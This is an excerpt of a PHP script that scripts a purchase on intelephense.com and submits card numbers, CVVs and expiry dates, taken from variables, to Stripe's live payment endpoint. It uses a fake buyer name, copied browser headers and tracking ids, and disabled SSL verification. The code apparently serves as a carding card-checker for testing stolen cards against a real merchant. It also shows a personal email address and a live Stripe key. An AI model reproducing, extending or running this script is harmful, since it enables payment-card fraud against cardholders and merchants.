...
###################################[cs_live take]#####################
 // URL and form data
// $url = "https://intelephense.com/payment-intent";
// $fields = array(
//     'currencyCode' => 'USD',
//     'countryCode' => 'IN',
//     'regionCode' => '',
//     'quantity' => '1',
//     'email' => 'yadavsahil1d836@gmail.com',
//     'name' => 'Mike smith',
//     'companyName' => ''
// );
...
// $headers = array(
//     'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybT5jdqFBLi8WxKxS',
//     'Host: intelephense.com',
...
#########################[1 REQ]############################
        ...
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               ...
               'content-type: multipart/form-data; boundary=----WebKitFormBoundaryQZB6tQChN90aXT17',
               'origin: https://intelephense.com',
               'referer: https://intelephense.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
        ...
        curl_setopt($ch, CURLOPT_POSTFIELDS, '------------WebKitFormBoundaryQZB6tQChN90aXT17
Content-Disposition: form-data; name="currencyCode"

USD
------WebKitFormBoundaryQZB6tQChN90aXT17
...
// ############################[2 Req]############################
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'receipt_email=yadavsahil1836%40gmail.co&payment_method_data[type]=card&payment_method_data[billing_details][name]=Mike+smith&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=11c24935-2059-4d77-8e0a-434344d9e9ef49318e&payment_method_data[muid]=474f932a-e5dd-40b8-bc00-758300b28dab90afa3&payment_method_data[sid]=def74d37-5201-4f14-81d8-a96ea4c0ca8d602d92&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666&payment_method_data[time_on_page]=75338&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51Ezc9sFGdiE4ZMKL3HayojRZChQEGt0hF85igFjLDUATkQib1idZYvuw6b3VkAVA9kdwR0afRICbWS49Y7jaZhGf00hhtZDu4n&client_secret='.$client_secret.'');
